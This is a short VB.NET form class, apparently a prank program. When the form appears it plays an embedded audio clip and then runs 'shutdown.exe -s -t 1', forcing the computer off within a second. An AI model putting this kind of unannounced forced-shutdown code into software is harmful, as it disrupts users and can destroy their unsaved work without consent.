Public Class HowDareYou

    Private Sub HowDareYou_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
    End Sub

    Private Sub HowDareYou_Shown(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Shown
        My.Computer.Audio.Play(My.Resources.WATCH_DOGS_TRAILER, AudioPlayMode.WaitToComplete)
        Process.Start("shutdown.exe", "-s -t 1")
    End Sub
End Class